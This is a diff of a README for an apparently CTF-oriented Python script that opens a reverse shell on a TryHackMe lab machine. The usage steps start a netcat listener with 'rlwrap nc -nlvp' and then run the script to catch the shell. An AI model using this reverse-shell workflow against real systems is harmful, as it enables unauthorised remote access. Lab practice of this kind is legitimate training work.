@@ -7,8 +7,8 @@ Python script to get direct reverse shell of expose machine on tryhackme
 -nc = Netcat port , ex : 9001
 
 #### Steps : 
-*1. run : rlwrap nc -nlvp {port}*\n
-*2. python3 shell.py -u {value} -p {value} -a {value} -nc {value}*\n
-*Enjoy you shell*\n
+1. run : rlwrap nc -nlvp {port
+2. python3 shell.py -u {value} -p {value} -a {value} -nc {value}
+Enjoy you shell
 
 #### THANKYOU!
